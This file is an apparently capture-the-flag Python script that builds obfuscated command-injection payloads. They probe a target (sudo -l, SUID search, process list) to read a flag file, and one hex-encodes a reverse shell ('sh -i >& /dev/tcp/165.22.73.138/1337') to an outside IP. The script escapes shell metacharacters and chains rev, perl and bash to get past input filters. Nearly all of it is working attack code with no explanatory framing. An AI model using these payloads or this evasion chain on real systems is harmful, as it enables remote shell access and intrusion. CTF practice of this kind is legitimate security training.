# payload = "print(bytes([108,115,32,45,97,108]).decode())#"
# payload = r"""print("ls\x20"."\x2dal")#"""
payload = r"""print("sudo\x20"."\x2dl")#"""
payload = r"""print("sudo\x20"."cat\x20"."/bonus_flag")#"""
payload = r"""print("cat\x20"."\x20/bonus_flag\x202>&1")#"""
payload = r"""print("ls\x20"."\x2dal\x20/bonus_flag")#"""
payload = r"""print("chown\x20user\x20bonus_flag\x202>&1;ls\x20"."\x2dal\x20bonus_flag\x202&>1;")#"""
payload = r"""print("ps\x20aux")#"""
payload = r"""print("su\x20nobody\x20"."\x2dc\x20'ls'\x202>&1")#"""
payload = r"""print("find\x20/\x20"."\x2dperm\x20"."\x2d4000\x20")#"""
payload = r"""print("/dig\x20"."\x2dh")#"""
payload = r"""print("/dig\x20"."\x2dv\x202>&1")#"""
payload = r"""print("ls\x20"."\x2dal\x20dig")#"""
payload = r"""print("./dig\x20"."\x2df\x20bonus_flag")#"""
payload = r"""print("./dig\x20"."\x2df\x20./bonus_flag\x20hi\x202>&1")#"""
payload = r"""print("bash\x20"."\x2dc\x20'dig\x20"."\x2df\x20./bonus_flag\x20hi\x202>/dev/stdout'")#"""
payload = r"""print("uname\x20"."\x2da")#"""
payload = r"""print("nc\x20"."\x2dh")#"""
payload = r"""print("ls\x20"."\x2dal\x20/usr/bin")#"""


payload = b"sh -i >& /dev/tcp/165.22.73.138/1337 0>&1"
encoded = '"'
for byte in payload:
    encoded += "\\x" + hex(byte)[2:].zfill(2)
    encoded += '"."'
# Remove last ."
encoded = encoded[:-2]

print(encoded)

payload = r"""print(""" + encoded + r""")#"""
print(payload)
# payload = r"""print("sh\x20"."\x2dc\x20'dig\x20"."\x2df\x20bonus_flag\x20hi'")#"""
# payload = r"""console.log("ls\x20\x2dla")/*"""
# payload = "<?php"
# payload = "2>&1;"
# payload = "hiiiii"

print(payload)

payload = payload[::-1]
payload = payload.replace("\\", "\\\\\\\\")
payload = payload.replace("'", r"\\\'")
payload = payload.replace("\"", r"\\\"")
payload = payload.replace(")", r"\\\)")
payload = payload.replace("(", r"\\\(")
payload = payload.replace("]", r"\\\]")
payload = payload.replace("[", r"\\\[")
payload = payload.replace("#", r"\\\#")
payload = payload.replace(">", r"\\\>")
payload = payload.replace("&", r"\\\&")
payload = payload.replace(";", r"\\\;")
# ')' -> '\\\)'
# '(' -> '\\\('

# ']' -> '\\\]'
# '[' -> '\\\['

print(payload)

print(payload+r"|rev>/tmp/bleh;echo`cat</tmp/bleh`>/tmp/gamer;perl</tmp/gamer|bash")
